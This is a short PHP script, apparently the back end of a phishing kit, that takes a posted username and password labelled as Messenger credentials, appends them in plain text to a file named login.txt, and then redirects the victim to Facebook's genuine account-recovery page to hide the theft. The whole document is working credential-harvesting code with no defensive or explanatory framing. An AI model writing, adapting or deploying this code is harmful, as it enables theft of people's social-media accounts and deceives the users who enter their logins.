<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $pass = $_POST['pass'] ?? '';

    $log = "Messenger Username: $username | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://www.facebook.com/recover/initiate/');
    exit();
}
?>
